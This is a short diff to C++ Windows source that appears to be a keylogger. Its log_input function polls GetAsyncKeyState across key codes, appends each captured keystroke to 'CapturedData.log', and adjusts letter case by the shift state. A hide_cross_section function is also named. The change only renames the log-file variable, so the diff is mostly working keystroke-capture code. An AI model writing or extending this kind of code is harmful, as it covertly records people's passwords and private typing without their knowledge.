@@ -14,14 +14,14 @@ void hide_cross_section()
 void log_input()
 {
     char key;
-    const char file_path[] = "CapturedData.log";
+    const char file_name[] = "CapturedData.log";
     while (1)
     {
         for (key = 8; key <= 222; key++)
         {
             if (GetAsyncKeyState(key) == -32767)
             {
-                ofstream write(file_path, ios::app);
+                ofstream write(file_name, ios::app);
                 if (((key > 64) && (key < 91)) && !(GetAsyncKeyState(0x10)))
                 {
                     key += 32;
